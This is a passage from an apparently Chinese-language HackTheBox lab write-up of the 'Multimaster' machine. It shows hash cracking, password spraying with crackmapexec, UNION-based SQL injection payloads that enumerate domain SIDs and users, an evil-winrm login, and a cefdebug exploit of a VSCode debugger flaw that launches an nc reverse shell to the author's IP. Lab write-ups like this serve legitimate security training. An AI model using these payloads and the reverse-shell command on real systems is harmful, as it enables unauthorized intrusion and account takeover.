<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739<br>fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa<br>68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813<br>cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc<br></code></pre></td></tr></table></figure>

<p>在线网站识别的是SHA2-384：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://www.tunnelsup.com/hash-analyzer/<br></code></pre></td></tr></table></figure>

<p>john自动识别的是SHA-384,但是没跑出来：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ john <span class="hljs-built_in">hash</span> -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt<br>--------------------------------------------------------------------------<br>The library attempted to open the following supporting CUDA libraries,<br>but each of them failed.  CUDA-aware support is disabled.<br>libcuda.so.1: cannot open shared object file: No such file or directory<br>libcuda.dylib: cannot open shared object file: No such file or directory<br>/usr/lib64/libcuda.so.1: cannot open shared object file: No such file or directory<br>/usr/lib64/libcuda.dylib: cannot open shared object file: No such file or directory<br>If you are not interested <span class="hljs-keyword">in</span> CUDA-aware support, <span class="hljs-keyword">then</span> run with<br>--mca opal_warn_on_missing_libcuda 0 to suppress this message.  If you are interested<br><span class="hljs-keyword">in</span> CUDA-aware support, <span class="hljs-keyword">then</span> try setting LD_LIBRARY_PATH to the location<br>of libcuda.so.1 to get passed this issue.<br>--------------------------------------------------------------------------<br>Using default input encoding: UTF-8<br>Loaded 4 password hashes with no different salts (Raw-SHA384 [SHA384 128/128 AVX 2x])<br>Warning: poor OpenMP scalability <span class="hljs-keyword">for</span> this <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span>, consider --fork=16<br>Will run 16 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>0g 0:00:00:00 DONE (2022-12-22 14:54) 0g/s 16116Kp/s 16116Kc/s 64466KC/s (CAMO)..*7¡Vamos!<br></code></pre></td></tr></table></figure>

<p>最后去尝试了其他类型跑了出来：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ hashcat -a 0 -m 17900 --force ./hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --force <br>hashcat (v6.2.6) starting<br><br>You have enabled --force to bypass dangerous warnings and errors!<br>This can hide serious problems and should only be <span class="hljs-keyword">done</span> when debugging.<br>Do not report hashcat issues encountered when using --force.<br><br>OpenCL API (OpenCL 3.0 PoCL 3.1  Linux, Release, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>======================================================================================================================================<br>* Device <span class="hljs-comment">#1: pthread-AMD Ryzen 7 6800H with Radeon Graphics, 14349/28763 MB (4096 MB allocatable), 16MCU</span><br><br>/usr/share/hashcat/OpenCL/m17900_a0-optimized.cl: Pure kernel not found, falling back to optimized kernel<br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 31<br><br>Hashes: 4 digests; 4 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 1<br><br>Optimizers applied:<br>* Optimized-Kernel<br>* Zero-Byte<br>* Not-Iterated<br>* Single-Salt<br>* Raw-Hash<br>* Uses-64-Bit<br><br>Watchdog: Temperature abort trigger <span class="hljs-built_in">set</span> to 90c<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: 4 MB<br><br>Dictionary cache built:<br>* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt<br>* Passwords.: 14344391<br>* Bytes.....: 139921497<br>* Keyspace..: 14344384<br>* Runtime...: 0 secs<br><br>9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1<br>68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1<br>fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking<br></code></pre></td></tr></table></figure>

<p>但是接着数据库里的用户名是无法访问还是都对不上没法用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ crackmapexec smb 10.10.10.179 -u user -p passwd --continue-on-success<br>SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)<br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:password1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:finance1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:banking STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:password1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:finance1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:banking STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:password1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:finance1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:banking STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:password1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:finance1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:banking STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\shayna:password1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\shayna:finance1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\shayna:banking STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\james:password1 STATUS_LOGON_FAILURE <br></code></pre></td></tr></table></figure>

<h3 id="Active-Directory-SID"><a href="#Active-Directory-SID" class="headerlink" title="Active Directory SID:"></a>Active Directory SID:</h3><p>我将使用sqlmap的payload:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Type: UNION query<br>Title: Generic UNION query (NULL) - 5 columns<br>Payload: &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;-1791&#x27; UNION ALL SELECT 92,92,CHAR(113)+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(113)+CHAR(87)+CHAR(85)+CHAR(111)+CHAR(69)+CHAR(72)+CHAR(85)+CHAR(73)+CHAR(88)+CHAR(89)+CHAR(85)+CHAR(72)+CHAR(69)+CHAR(89)+CHAR(68)+CHAR(74)+CHAR(109)+CHAR(103)+CHAR(104)+CHAR(98)+CHAR(117)+CHAR(70)+CHAR(121)+CHAR(68)+CHAR(74)+CHAR(109)+CHAR(79)+CHAR(121)+CHAR(90)+CHAR(115)+CHAR(74)+CHAR(110)+CHAR(74)+CHAR(80)+CHAR(82)+CHAR(117)+CHAR(110)+CHAR(74)+CHAR(78)+CHAR(113)+CHAR(72)+CHAR(113)+CHAR(122)+CHAR(113)+CHAR(106)+CHAR(113),92,92-- rPjk&quot;</span>&#125;<br></code></pre></td></tr></table></figure>

<p>这个payload其实就是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-1791<span class="hljs-string">&#x27; UNION ALL SELECT 92,92,92,92,92-- rPjk</span><br></code></pre></td></tr></table></figure>

<p>在线转码工具：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://dencode.com/string/unicode-escape<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222200932367.png" srcset="/img/loading.gif" lazyload alt="image-20221222200932367">这边有email，回显是占位符是92，然后我找到了这篇文章：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/<br></code></pre></td></tr></table></figure>

<p>可以查看所属域：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-1791<span class="hljs-string">&#x27; UNION ALL SELECT 92,92,92,DEFAULT_DOMAIN() as mydomain,92-- rPjk </span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222201945668.png" srcset="/img/loading.gif" lazyload alt="image-20221222201945668"></p>
<p>查看域SID：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-1791<span class="hljs-string">&#x27; UNION ALL SELECT 92,92,92,SUSER_SID(&#x27;</span>MEGACORP\Domain Admins<span class="hljs-string">&#x27;),92-- rPjk </span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222204303320.png" srcset="/img/loading.gif" lazyload alt="image-20221222204303320"></p>
<p>这个似乱码的东西细看不是乱码，只是格式不对，然后通过GOOGLE可以找到一下文章：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://stackoverflow.com/questions/703019/convert-integer-to-hex-and-hex-to-integer<br></code></pre></td></tr></table></figure>

<p>然后可以将SID转换成十六进制：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-1791<span class="hljs-string">&#x27; UNION ALL SELECT 92,92,92,master.dbo.fn_varbintohexstr(SUSER_SID(&#x27;</span>MEGACORP\Domain Admins<span class="hljs-string">&#x27;)),92-- rPjk </span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222204631610.png" srcset="/img/loading.gif" lazyload alt="image-20221222204631610"></p>
<p>域的SID就是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x0105000000000005150000001c00d1bcd181f1492bdfc236<br></code></pre></td></tr></table></figure>

<p>而管理员组的SID是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000<br></code></pre></td></tr></table></figure>

<p>我可以再查询一下域普通用户组：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x0105000000000005150000001c00d1bcd181f1492bdfc23601020000<br></code></pre></td></tr></table></figure>

<p>可以再查一个已经存在的用户<strong>sbauer</strong>的SID：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x0105000000000005150000001c00d1bcd181f1492bdfc2361e0c0000<br></code></pre></td></tr></table></figure>

<p>管理员的SID：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000<br></code></pre></td></tr></table></figure>

<h3 id="Enumeration-Users"><a href="#Enumeration-Users" class="headerlink" title="Enumeration Users:"></a>Enumeration Users:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html<span class="hljs-comment">#smb---tcp-445</span><br></code></pre></td></tr></table></figure>

<p>借了别人的脚本，枚举域内用户的sid：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ python enumsiduser.py<br>[*] Finding domain<br>[+] Found domain: MEGACORP<br>[*] Finding Domain SID<br>[+] Found SID <span class="hljs-keyword">for</span> MEGACORP domain: 0x0105000000000005150000001c00d1bcd181f1492bdfc236<br>[+] Found account [01110]  MEGACORP\tushikikatomo                              <br>[+] Found account [01111]  MEGACORP\andrew                              <br>[+] Found account [01112]  MEGACORP\lana               <br>[+] Found account [03115]  MEGACORP\aldom                              <br>[+] Found account [03116]  MEGACORP\jsmmons                              <br>[+] Found account [03117]  MEGACORP\pmartin                              <br>[+] Found account [03119]  MEGACORP\Developers  <br></code></pre></td></tr></table></figure>

<p>跑了四个新的用户名：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ crackmapexec winrm 10.10.10.179 -u user -p passwd --continue-on-success | grep [+]<br>WINRM                    10.10.10.179    5985   MULTIMASTER      [+] MEGACORP.LOCAL\tushikikatomo:finance1 (Pwn3d!)<br></code></pre></td></tr></table></figure>

<p>可以用winrm登陆：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ evil-winrm -u <span class="hljs-string">&quot;MEGACORP\tushikikatomo&quot;</span> -p finance1 -i 10.10.10.179<br><br>Evil-WinRM shell v3.4<br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\alcibiades\Documents&gt; <span class="hljs-built_in">whoami</span><br>megacorp\tushikikatomo<br>*Evil-WinRM* PS C:\Users\alcibiades\Documents&gt; <br></code></pre></td></tr></table></figure>

<p>然后可以上传SharpHound.exe，对域内情况进行分析探索。</p>
<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221223092643413.png" srcset="/img/loading.gif" lazyload alt="image-20221223092643413"></p>
<p>Bloodhound中显示tushikikatomo可以使用powershell建立会话横向移动到域控制器上，但是需要想法子将自己提升为系统权限然后才能够对域控发起DCSync，所以目前只能寻找有无其他用户的凭证泄漏或者系统漏洞。</p>
<h3 id="Get-Cyork-Shell"><a href="#Get-Cyork-Shell" class="headerlink" title="Get Cyork Shell:"></a>Get Cyork Shell:</h3><p>在进程信息中有显示一堆Code进程，这个是微软的VSCode:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\alcibiades\Documents&gt; <span class="hljs-built_in">ps</span><br><br>Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  <span class="hljs-built_in">SI</span> ProcessName<br><span class="hljs-literal">-------</span>  <span class="hljs-literal">------</span>    <span class="hljs-literal">-----</span>      <span class="hljs-literal">-----</span>     <span class="hljs-literal">------</span>     <span class="hljs-literal">--</span>  <span class="hljs-literal">--</span> <span class="hljs-literal">-----------</span><br>    <span class="hljs-number">224</span>      <span class="hljs-number">15</span>     <span class="hljs-number">6128</span>       <span class="hljs-number">2696</span>               <span class="hljs-number">628</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">389</span>      <span class="hljs-number">51</span>    <span class="hljs-number">88816</span>      <span class="hljs-number">33460</span>              <span class="hljs-number">3336</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">407</span>      <span class="hljs-number">60</span>   <span class="hljs-number">150068</span>     <span class="hljs-number">186284</span>              <span class="hljs-number">3864</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">410</span>      <span class="hljs-number">61</span>   <span class="hljs-number">153536</span>     <span class="hljs-number">181932</span>              <span class="hljs-number">3956</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">276</span>      <span class="hljs-number">51</span>    <span class="hljs-number">58636</span>      <span class="hljs-number">10692</span>              <span class="hljs-number">4480</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">318</span>      <span class="hljs-number">31</span>    <span class="hljs-number">41856</span>      <span class="hljs-number">25192</span>              <span class="hljs-number">5028</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">278</span>      <span class="hljs-number">53</span>    <span class="hljs-number">61768</span>      <span class="hljs-number">71292</span>              <span class="hljs-number">5152</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">421</span>      <span class="hljs-number">55</span>    <span class="hljs-number">97228</span>      <span class="hljs-number">67532</span>              <span class="hljs-number">5308</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">278</span>      <span class="hljs-number">53</span>    <span class="hljs-number">67688</span>      <span class="hljs-number">76924</span>              <span class="hljs-number">5532</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">421</span>      <span class="hljs-number">23</span>    <span class="hljs-number">15584</span>       <span class="hljs-number">6604</span>              <span class="hljs-number">5568</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">276</span>      <span class="hljs-number">52</span>    <span class="hljs-number">46200</span>      <span class="hljs-number">35532</span>              <span class="hljs-number">5644</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">675</span>      <span class="hljs-number">61</span>    <span class="hljs-number">33520</span>      <span class="hljs-number">87964</span>              <span class="hljs-number">6072</span>   <span class="hljs-number">1</span> Code<br></code></pre></td></tr></table></figure>

<p>VSCode存在有一个本地代码执行的漏洞，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://iwantmore.pizza/posts/cve-2019-1414.html<br></code></pre></td></tr></table></figure>

<p>然后找了这样一个工具：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/taviso/cefdebug<br></code></pre></td></tr></table></figure>

<p>然后根据github的文档，可以执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\cefdebug.exe<br></code></pre></td></tr></table></figure>

<p>会找到当前开启的一些TCP端口，端口是随即开放的，也随时会换掉，所以这个洞要利用需要抓紧时间：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\alcibiades\desktop&gt; .\cefdebug.exe<br>cefdebug.exe : [2022/12/22 17:58:02:4557] U: There are 2 tcp sockets <span class="hljs-keyword">in</span> state listen.<br>    + CategoryInfo          : NotSpecified: ([2022/12/22 17:...n state listen.:String) [], RemoteException<br>    + FullyQualifiedErrorId : NativeCommandError<br>[2022/12/22 17:58:22:4995] U: There were 0 servers that appear to be CEF debuggers.<br>*Evil-WinRM* PS C:\Users\alcibiades\desktop&gt; .\cefdebug.exe<br>cefdebug.exe : [2022/12/22 17:58:26:9531] U: There are 3 tcp sockets <span class="hljs-keyword">in</span> state listen.<br>    + CategoryInfo          : NotSpecified: ([2022/12/22 17:...n state listen.:String) [], RemoteException<br>    + FullyQualifiedErrorId : NativeCommandError<br>[2022/12/22 17:58:46:9686] U: There were 1 servers that appear to be CEF debuggers.<br>[2022/12/22 17:58:46:9686] U: ws://127.0.0.1:7364/1fb8ff08-738f-48d5-b4ce-53a6068f46fe<br></code></pre></td></tr></table></figure>

<p>事先找个目录存放nc：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\alcibiades\desktop&gt; copy nc64.exe C:\\programdata\\nc.exe<br>*Evil-WinRM* PS C:\Users\alcibiades\desktop&gt; <span class="hljs-built_in">ls</span> C:\\programdata<br><br><br>    Directory: C:\programdata<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----        7/16/2016   6:23 AM                Comms<br>d---s-         1/9/2020   1:18 PM                Microsoft<br>d-----        7/19/2021   1:07 AM                Package Cache<br>d-----        9/25/2019  10:54 AM                regid.1991-06.com.microsoft<br>d-----        7/16/2016   6:23 AM                SoftwareDistribution<br>d-----       11/20/2016   5:15 PM                USOPrivate<br>d-----       11/20/2016   5:15 PM                USOShared<br>da----        7/19/2021   1:07 AM                VMware<br>d-----         1/7/2020   7:45 PM                VsTelemetry<br>-a----       12/22/2022   6:01 PM          45272 nc.exe<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\alcibiades\desktop&gt; .\cefdebug.exe<br>cefdebug.exe : [2022/12/22 18:11:04:7486] U: There are 4 tcp sockets <span class="hljs-keyword">in</span> state listen.<br>    + CategoryInfo          : NotSpecified: ([2022/12/22 18:...n state listen.:String) [], RemoteException<br>    + FullyQualifiedErrorId : NativeCommandError<br>[2022/12/22 18:11:24:8133] U: There were 2 servers that appear to be CEF debuggers.<br>[2022/12/22 18:11:24:8133] U: ws://127.0.0.1:30903/faa39325-22c7-46bd-9bb9-4e54ecbf30e3<br>[2022/12/22 18:11:24:8133] U: ws://127.0.0.1:35281/b194eb4c-9af8-4855-9f8f-42bf74351c49<br>*Evil-WinRM* PS C:\Users\alcibiades\desktop&gt; .\cefdebug.exe --code <span class="hljs-string">&quot;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;C:\\programdata\\nc.exe 10.10.16.15 443 -e cmd&#x27;)&quot;</span> --url ws://127.0.0.1:35281/b194eb4c-9af8-4855-9f8f-42bf74351c49<br>cefdebug.exe : [2022/12/22 18:11:40:7244] U: &gt;&gt;&gt; process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;C:\\programdata\\nc.exe 10.10.16.15 443 -e cmd&#x27;</span>)<br>    + CategoryInfo          : NotSpecified: ([2022/12/22 18:...15 443 -e cmd<span class="hljs-string">&#x27;):String) [], RemoteException</span><br><span class="hljs-string">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="hljs-string">[2022/12/22 18:11:40:7244] U: &lt;&lt;&lt; ChildProcess</span><br><span class="hljs-string">*Evil-WinRM* PS C:\Users\alcibiades\desktop&gt; </span><br></code></pre></td></tr></table></figure>

<p>我以为是系统的，但差了点：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">Archlinux:~/<span class="hljs-title">HackTheBox</span>/<span class="hljs-title">cefdebug</span>$ <span class="hljs-title">sudo</span> <span class="hljs-title">nc</span> -<span class="hljs-title">lvnp</span> 443</span><br><span class="hljs-function">[<span class="hljs-title">sudo</span>] <span class="hljs-title">archlinux</span> 的密码：<span class="hljs-title">Listening</span> <span class="hljs-title">on</span> 0.0.0.0 443</span><br><span class="hljs-function"><span class="hljs-title">Connection</span> <span class="hljs-title">received</span> <span class="hljs-title">on</span> 10.10.10.179 49986</span><br><span class="hljs-function"><span class="hljs-title">Microsoft</span> <span class="hljs-title">Windows</span> [<span class="hljs-title">Version</span> 10.0.14393]</span><br><span class="hljs-function">(<span class="hljs-title">c</span>) 2016 <span class="hljs-title">Microsoft</span> <span class="hljs-title">Corporation</span>. <span class="hljs-title">All</span> <span class="hljs-title">rights</span> <span class="hljs-title">reserved</span>.</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">Microsoft</span> <span class="hljs-title">VS</span> <span class="hljs-title">Code</span>&gt;<span class="hljs-title">whoami</span></span><br><span class="hljs-function"><span class="hljs-title">whoami</span></span><br><span class="hljs-function"><span class="hljs-title">megacorp</span>\<span class="hljs-title">cyork</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">Microsoft</span> <span class="hljs-title">VS</span> <span class="hljs-title">Code</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="Get-Sbauer-Shell"><a href="#Get-Sbauer-Shell" class="headerlink" title="Get Sbauer Shell:"></a>Get Sbauer Shell:</h3><p>在C:\inetpub\wwwroot\bin目录下有一些直接点题的Multimaster：</p>
